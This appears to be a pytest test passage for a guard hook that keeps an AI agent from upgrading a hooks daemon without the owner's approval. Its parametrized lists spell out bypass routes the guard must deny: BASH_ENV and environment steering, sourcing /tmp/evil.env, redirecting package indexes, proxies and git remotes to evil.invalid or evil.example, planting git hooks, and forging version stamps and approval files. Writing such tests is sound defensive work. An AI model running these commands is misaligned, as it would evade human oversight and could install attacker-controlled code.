            "cd {project} && PYTHONPATH=/p/src $V/python scratch/probe.py; popd",
            "PYTHONPATH=/p/src $V/python scratch/probe.py; cd {project}",
        ],
    )
    def test_an_uncertain_cd_keeps_the_deny(
        self,
        handler: UpgradeApprovalGuardHandler,
        project: Path,
        elsewhere: Path,
        tmp_path: Path,
        command_template: str,
    ) -> None:
        command = command_template.format(project=project, missing=tmp_path / "missing")
        assert handler.matches(_bash(command, cwd=str(elsewhere))) is True, command


class TestSteeredUpgradesStayDeniedWhateverTheInterpreter:
    """Ledger 00474 N292: pins every way the upgrade is still recognised on a
    command that sets PYTHONPATH, so allowing the plain probe above cannot
    weaken any of them."""

    @pytest.mark.parametrize(
        "command",
        [
            "PYTHONPATH=/p/src bash scripts/upgrade.sh --project-root .",
            "PYTHONPATH=/p/src scripts/upgrade_version.sh /p /p/.claude/hooks-daemon v4.0.0",
            "PYTHONPATH=/p/src bash scripts/upgrade_version.sh /p /c v4.0.0",
            "PYTHONPATH=/p/src $V/python scripts/upgrade_gate_standalone.py check",
            "PYTHONPATH=/p/src $V/python /c/scripts/upgrade_gate_standalone.py",
            "cd /p && PYTHONPATH=/p/src $V/python scripts/upgrade_gate_standalone.py",
        ],
    )
    def test_the_upgrade_by_name(self, handler: UpgradeApprovalGuardHandler, command: str) -> None:
        hook_input = _bash(command, cwd="/")
        assert handler.matches(hook_input) is True, command
        result = handler.handle(hook_input)
        assert result.reason is not None
        assert result.reason.startswith(f"BLOCKED [{ENV_RULE_ID}]")

    def test_a_script_whose_content_carries_the_handoff_variable(
        self, handler: UpgradeApprovalGuardHandler, tmp_path: Path
    ) -> None:
        script = tmp_path / "renamed.sh"
        script.write_text(f"#!/bin/bash\n# {ENV_VAR_UPGRADE_HANDOFF}\n")
        for command in (
            f"PYTHONPATH=/p/src bash {script}",
            f"PYTHONPATH=/p/src $V/python {script}",
            f"cd {tmp_path} && PYTHONPATH=/p/src bash renamed.sh",
        ):
            assert handler.matches(_bash(command, cwd="/")) is True, command

    def test_an_unreadable_script_run_with_upgrade_arguments(
        self, handler: UpgradeApprovalGuardHandler, tmp_path: Path
    ) -> None:
        for command in (
            'tmp=$(mktemp); PYTHONPATH=/p/src bash "$tmp" --project-root .',
            'PYTHONPATH=/p/src bash "$tmp" --project-root .',
            'PYTHONPATH=/p/src bash "$tmp" /p /p/.claude/hooks-daemon v4.0.0',
            f"PYTHONPATH=/p/src bash {tmp_path / 'gone.sh'} --project-root .",
        ):
            assert handler.matches(_bash(command, cwd=str(tmp_path))) is True, command

    def test_the_skip_reading_confirmation_flag(self, handler: UpgradeApprovalGuardHandler) -> None:
        command = "PYTHONPATH=/p/src $V/python x.py --skip-reading-confirmation"
        assert handler.matches(_bash(command, cwd="/")) is True


class TestEverySpellingOfSteeringIsSteering:
    """Plan 00376 review4 MAJOR 1: the steering check matched `NAME=`,
    `export NAME` and `declare -x NAME`, and a direct Layer 2 call then ran
    past the gate with `BASH_ENV` set by another spelling. On a command that
    runs the upgrade, any non-read mention of a steering name, any export of
    a name that is not a literal, `set -a`, a `declare`/`typeset`/`local` flag
    containing `x`, `eval` and sourcing another file all count as steering.
    """

    @pytest.mark.parametrize(
        "command",
        [
            f"read -r BASH_ENV <<< f; declare -gx BASH_ENV; {_LAYER2_RUN}",
            f"printf -v BASH_ENV %s f; export -- BASH_ENV; {_LAYER2_RUN}",
            f"set -a; read -r BASH_ENV <<< f; {_LAYER2_RUN}",
            f'n=BASH_ENV; export "$n=f"; {_LAYER2_RUN}',
            f"unset() {{ :; }}; declare -f -x unset; {_LAYER2_RUN}",
            f"typeset -gx BASH_ENV=f; {_LAYER2_RUN}",
            f'n=BASH_; n+=ENV; set -a; read -r "$n" <<< f; {_LAYER2_RUN}',
            f'n=BASH_; n+=ENV; set -o allexport; read -r "$n" <<< f; {_LAYER2_RUN}',
            f'n=BASH_; n+=ENV; export "$n"; {_LAYER2_RUN}',
            f'n=BASH_; n+=ENV; declare -x "$n=f"; {_LAYER2_RUN}',
            f'n=BASH_; n+=ENV; env "$n=f" {_LAYER2_RUN}',
            f'eval "$x"; {_LAYER2_RUN}',
            f"source /tmp/evil.env; {_LAYER1_RUN}",
            f". /tmp/evil.env && {_LAYER1_RUN}",
        ],
    )
    def test_denies_each_spelling(self, handler: UpgradeApprovalGuardHandler, command: str) -> None:
        hook_input = _bash(command)
        assert handler.matches(hook_input) is True, command
        result = handler.handle(hook_input)
        assert result.reason is not None
        assert result.reason.startswith(f"BLOCKED [{ENV_RULE_ID}]")

    @pytest.mark.parametrize(
        "command",
        [
            f"export NO_COLOR=1 && {_LAYER1_RUN}",
            f"set -euo pipefail; {_LAYER1_RUN}",
            f'echo "$HOME"; ls "$HOME/.cache"; {_LAYER1_RUN}',
            f"UV_LINK_MODE=copy {_LAYER1_RUN}",
            'tmp="$(mktemp)" && git -C .claude/hooks-daemon show "v4.0.0:scripts/upgrade.sh"'
            ' > "$tmp" && bash "$tmp" --project-root "$PWD" v4.0.0',
            "set -a; source .env; set +a; make test",
            'eval "$(ssh-agent)"; bash "$script"',
            "read -r BASH_ENV <<< f; declare -gx BASH_ENV; make test",
        ],
    )
    def test_allows_the_same_shapes_without_the_upgrade_or_steering(
        self, handler: UpgradeApprovalGuardHandler, command: str
    ) -> None:
        assert handler.matches(_bash(command)) is False, command


class TestInstallerSteeringVariables:
    """Plan 00376 review4 m1: the variables Layer 1 forwards to Layer 2 that
    choose where the build backend and the package index come from, or which
    baseline the config merge diffs against, are denied on an upgrade command
    like the others."""

    @pytest.mark.parametrize(
        "assignment",
        [
            "UV_INDEX_URL=https://evil.invalid/simple",
            "UV_DEFAULT_INDEX=https://evil.invalid/simple",
            "UV_INDEX=evil=https://evil.invalid/simple",
            "UV_EXTRA_INDEX_URL=https://evil.invalid/simple",
            "UV_FIND_LINKS=/tmp/wheels",
            "UV_CONFIG_FILE=/tmp/uv.toml",
            "UV_PYTHON=/tmp/python",
            "SSL_CERT_FILE=/tmp/ca.pem",
            "REQUESTS_CA_BUNDLE=/tmp/ca.pem",
            "HTTPS_PROXY=http://evil.invalid:8080",
            "https_proxy=http://evil.invalid:8080",
            "HOOKS_DAEMON_OLD_DEFAULT_CONFIG=/tmp/baseline.yaml",
            "HOOKS_DAEMON_OLD_DEFAULT_SETTINGS=/tmp/settings.json",
        ],
    )
    def test_denies_it_on_an_upgrade(
        self, handler: UpgradeApprovalGuardHandler, assignment: str
    ) -> None:
        hook_input = _bash(f"{assignment} {_LAYER1_RUN}")
        assert handler.matches(hook_input) is True, assignment
        result = handler.handle(hook_input)
        assert result.reason is not None
        assert result.reason.startswith(f"BLOCKED [{ENV_RULE_ID}]")

    def test_allows_it_elsewhere(self, handler: UpgradeApprovalGuardHandler) -> None:
        assert handler.matches(_bash("UV_INDEX_URL=https://mirror/simple uv sync")) is False


class TestUvLocationSteering:
    """The uv that builds the venv decides what code the daemon runs. The human
    names it with `--uv <path>` or `PIPX_BIN_DIR`; an agent never does."""

    @pytest.mark.parametrize(
        "command",
        [
            f"{_LAYER1_RUN} --uv /tmp/evil/uv",
            f"{_LAYER1_RUN} --uv=/tmp/evil/uv",
            "bash scripts/upgrade.sh --uv /tmp/evil/uv --project-root .",
            "bash scripts/upgrade_version.sh . .claude/hooks-daemon v4.0.0 --uv /tmp/evil/uv",
            'bash "$tmp" --project-root . --uv /tmp/evil/uv v4.0.0',
            "bash -c 'bash scripts/upgrade.sh --project-root . --uv /tmp/evil/uv'",
        ],
    )
    def test_denies_uv_argument_on_an_upgrade(
        self, handler: UpgradeApprovalGuardHandler, command: str
    ) -> None:
        hook_input = _bash(command)
        assert handler.matches(hook_input) is True, command
        result = handler.handle(hook_input)
        assert result.reason is not None
        assert result.reason.startswith(f"BLOCKED [{ENV_RULE_ID}]")

    @pytest.mark.parametrize(
        "command",
        [
            f"PIPX_BIN_DIR=/tmp/evil {_LAYER1_RUN}",
            f"export PIPX_BIN_DIR=/tmp/evil && {_LAYER1_RUN}",
            f"env PIPX_BIN_DIR=/tmp/evil {_LAYER1_RUN}",
        ],
    )
    def test_denies_pipx_bin_dir_on_an_upgrade(
        self, handler: UpgradeApprovalGuardHandler, command: str
    ) -> None:
        hook_input = _bash(command)
        assert handler.matches(hook_input) is True, command
        result = handler.handle(hook_input)
        assert result.reason is not None
        assert result.reason.startswith(f"BLOCKED [{ENV_RULE_ID}]")

    @pytest.mark.parametrize(
        "command",
        [
            "PIPX_BIN_DIR=/tmp/bin pipx install uv",
            "uv --version",
            "echo 'bash scripts/upgrade.sh --uv /x'",
            "grep -- --uv scripts/upgrade.sh",
            "python3 tool.py --uv /some/path",
            _LAYER1_RUN,
        ],
    )
    def test_allows_them_elsewhere(
        self, handler: UpgradeApprovalGuardHandler, command: str
    ) -> None:
        assert handler.matches(_bash(command)) is False, command

    def test_deny_message_names_the_uv_steering_inputs(
        self, handler: UpgradeApprovalGuardHandler
    ) -> None:
        result = handler.handle(_bash(f"{_LAYER1_RUN} --uv /tmp/evil/uv"))
        assert result.reason is not None
        assert "--uv" in result.reason


class TestDaemonCloneGitMetadataWrites:
    """Plan 00376 review4 MAJOR 3 / review3 m2: an agent appending a
    `url.insteadOf` or a second origin URL to the clone's own `.git/config`
    by redirect redirected the next fetch. Layer 1 now refuses a rewritten
    fetch, and writing into the clone's `.git/` is denied like the other
    routes that decide what gets installed."""

    @pytest.mark.parametrize(
        "command",
        [
            "printf '[url \"/tmp/evil\"]\\n insteadOf = x\\n' >> .claude/hooks-daemon/.git/config",
            "cat /tmp/evil.cfg >> /p/.claude/hooks-daemon/.git/config",
            "cp /tmp/hook .claude/hooks-daemon/.git/hooks/post-checkout",
            "echo deadbeef > .claude/hooks-daemon/.git/refs/tags/v4.0.0",
        ],
    )
    def test_denies_a_bash_write(self, handler: UpgradeApprovalGuardHandler, command: str) -> None:
        hook_input = _bash(command)
        assert handler.matches(hook_input) is True, command
        result = handler.handle(hook_input)
        assert result.reason is not None
        assert result.reason.startswith(f"BLOCKED [{AGENT_RULE_ID}]")

    def test_denies_a_write_tool(self, handler: UpgradeApprovalGuardHandler) -> None:
        assert handler.matches(_write("/p/.claude/hooks-daemon/.git/config", "[url]")) is True

    @pytest.mark.parametrize(
        "command",
        [
            "cat .claude/hooks-daemon/.git/config",
            "echo x > .claude/hooks-daemon/untracked/notes.txt",
            "echo x > .git/config.bak",
        ],
    )
    def test_allows_reads_and_other_paths(
        self, handler: UpgradeApprovalGuardHandler, command: str
    ) -> None:
        assert handler.matches(_bash(command)) is False, command


class TestManualCheckoutOfTheDaemonClone:
    """Fresh review MAJOR 1: moving the daemon clone by hand IS an upgrade."""

    @pytest.mark.parametrize(
        "command",
        [
            "git -C .claude/hooks-daemon checkout v4.0.0",
            "git -C /work/p/.claude/hooks-daemon switch --detach v4.0.0",
            'git -C "$PWD/.claude/hooks-daemon/" checkout -q v4.0.0',
            "git -C .claude/hooks-daemon pull",
            "git -C .claude/hooks-daemon merge origin/main",
            "git -C .claude/hooks-daemon reset v4.0.0",
            "git --git-dir=.claude/hooks-daemon/.git --work-tree=.claude/hooks-daemon checkout v4",
            "git -c advice.detachedHead=false -C .claude/hooks-daemon checkout v4.0.0",
            "git -C .claude/hooks-daemon fetch --tags && git -C .claude/hooks-daemon checkout v4",
        ],
    )
    def test_denies_moving_the_daemon_checkout(
        self, handler: UpgradeApprovalGuardHandler, command: str
    ) -> None:
        hook_input = _bash(command)
        assert handler.matches(hook_input) is True, command
        result = handler.handle(hook_input)
        assert result.reason is not None
        assert result.reason.startswith(f"BLOCKED [{AGENT_RULE_ID}]")

    @pytest.mark.parametrize(
        "command",
        [
            "git -C .claude/hooks-daemon fetch --tags",
            'git -C .claude/hooks-daemon show "v4.0.0:scripts/upgrade.sh" > f',
            "git -C .claude/hooks-daemon describe --tags",
            "git -C .claude/hooks-daemon log --oneline -3",
            "git checkout main",
            "git -C src checkout -b feature",
            "grep 'git -C .claude/hooks-daemon checkout' docs/x.md",
        ],
    )
    def test_allows_reading_the_daemon_clone_and_other_checkouts(
        self, handler: UpgradeApprovalGuardHandler, command: str
    ) -> None:
        assert handler.matches(_bash(command)) is False, command


class TestDaemonCloneRemoteAndConfigRedirection:
    """review2 MINOR 2: a redirected `origin` decides which gate runs next.

    ``fetch --tags --force`` (Layer 1) resets a locally re-pointed TAG, but
    only to whatever `origin` NAMES -- so a `remote set-url` or a `config`
    write that changes what `origin` points to is the same class of route as
    the checkout/reset commands already denied: neither moves HEAD by itself,
    but both decide what the next `checkout` lands on.
    """

    @pytest.mark.parametrize(
        "command",
        [
            "git -C .claude/hooks-daemon remote set-url origin https://evil.example/x.git",
            "git -C .claude/hooks-daemon remote add upstream https://evil.example/x.git",
            "git -C .claude/hooks-daemon remote rename origin old",
            "git -C .claude/hooks-daemon remote remove origin",
            "git -C .claude/hooks-daemon remote rm origin",
            "git -C .claude/hooks-daemon config remote.origin.url https://evil.example/x.git",
            "git -C .claude/hooks-daemon config --add remote.origin.fetch '+refs/*:refs/*'",
            "git -C .claude/hooks-daemon config --unset remote.origin.url",
        ],
    )
    def test_denies_redirecting_where_the_clone_fetches_from(
        self, handler: UpgradeApprovalGuardHandler, command: str
    ) -> None:
        hook_input = _bash(command)
        assert handler.matches(hook_input) is True, command
        result = handler.handle(hook_input)
        assert result.reason is not None
        assert result.reason.startswith(f"BLOCKED [{AGENT_RULE_ID}]")

    @pytest.mark.parametrize(
        "command",
        [
            "git -C .claude/hooks-daemon remote -v",
            "git -C .claude/hooks-daemon remote show origin",
            "git -C .claude/hooks-daemon remote",
            "git -C .claude/hooks-daemon config --get remote.origin.url",
            "git -C .claude/hooks-daemon config -l",
            "git -C .claude/hooks-daemon config --list",
        ],
    )
    def test_allows_reading_the_clones_remote_and_config(
        self, handler: UpgradeApprovalGuardHandler, command: str
    ) -> None:
        assert handler.matches(_bash(command)) is False, command


class TestVenvVersionStampForgery:
    """Item 5: forging a venv's .daemon-version stamp."""

    @pytest.mark.parametrize(
        "command",
        [
            "echo 4.0.0 > untracked/venv-abc123/.daemon-version",
            "touch untracked/venv-abc123/.daemon-version",
            "cp /tmp/stamp untracked/venv-abc123/.daemon-version",
        ],
    )
    def test_denies_bash_write_to_the_stamp(
        self, handler: UpgradeApprovalGuardHandler, command: str
    ) -> None:
        hook_input = _bash(command)
        assert handler.matches(hook_input) is True
        result = handler.handle(hook_input)
        assert result.decision == "deny"
        assert result.reason is not None
        assert result.reason.startswith(f"BLOCKED [{AGENT_RULE_ID}]")

    def test_denies_write_tool(self, handler: UpgradeApprovalGuardHandler) -> None:
        hook_input = _write("untracked/venv-abc123/.daemon-version", "4.0.0\n")
        assert handler.matches(hook_input) is True

    def test_allows_reading_the_stamp(self, handler: UpgradeApprovalGuardHandler) -> None:
        assert handler.matches(_bash("cat untracked/venv-abc123/.daemon-version")) is False

    def test_allows_unrelated_daemon_version_mention(
        self, handler: UpgradeApprovalGuardHandler
    ) -> None:
        """A `.daemon-version` NOT under `untracked/venv*/` is out of scope."""
        assert handler.matches(_bash("cat some/other/.daemon-version")) is False
        assert handler.matches(_write("some/other/.daemon-version", "x")) is False

    def test_denies_a_stamp_under_a_project_that_itself_sits_under_untracked(
        self, handler: UpgradeApprovalGuardHandler
    ) -> None:
        """review2 N2: a project under ANY `untracked/` ancestor (this repo's
        own worktrees, e.g. `untracked/worktrees/<name>/`) still has its stamp
        recognised. Matching the FIRST `untracked` segment in the path missed
        the venv's own `untracked/venv*/` -- the one that actually decides --
        whenever an outer one came first.
        """
        path = "untracked/worktrees/worktree-x/.claude/hooks-daemon/untracked/venv-abc123/.daemon-version"
        assert handler.matches(_bash(f"echo 4.0.0 > {path}")) is True
        assert handler.matches(_write(path, "4.0.0\n")) is True


class TestNonMatchingCalls:
    def test_allows_non_bash_non_file_tool(self, handler: UpgradeApprovalGuardHandler) -> None:
        hook_input = {"tool_name": "Read", "tool_input": {"file_path": "README.md"}}
        assert handler.matches(hook_input) is False

    def test_allows_empty_bash_command(self, handler: UpgradeApprovalGuardHandler) -> None:
        assert handler.matches(_bash("")) is False

    def test_allows_ordinary_bash_command(self, handler: UpgradeApprovalGuardHandler) -> None:
        assert handler.matches(_bash("git status")) is False


class TestGetRules:
    def test_returns_two_rules(self, handler: UpgradeApprovalGuardHandler) -> None:
        rules = handler.get_rules()
        assert len(rules) == 2
        assert all(isinstance(rule, Rule) for rule in rules)
        assert {rule.rule_id for rule in rules} == {AGENT_RULE_ID, ENV_RULE_ID}


class TestDenyMessageContent:
    def test_agent_action_message_names_the_owner_and_the_remedy(
        self, handler: UpgradeApprovalGuardHandler
    ) -> None:
        result = handler.handle(_bash("touch untracked/upgrade-approvals/4.0.0.approved"))
        assert result.reason is not None
        assert "owner" in result.reason.lower()
        assert "approve-upgrade" in result.reason
        assert "TTY" in result.reason or "terminal" in result.reason.lower()

    def test_env_bypass_message_names_layer1_as_the_only_route(
        self, handler: UpgradeApprovalGuardHandler
    ) -> None:
        result = handler.handle(_bash("export HOOKS_DAEMON_UPGRADE_HANDOFF=/tmp/x"))
        assert result.reason is not None
        assert "Layer 1" in result.reason
        assert "scripts/upgrade.sh" in result.reason
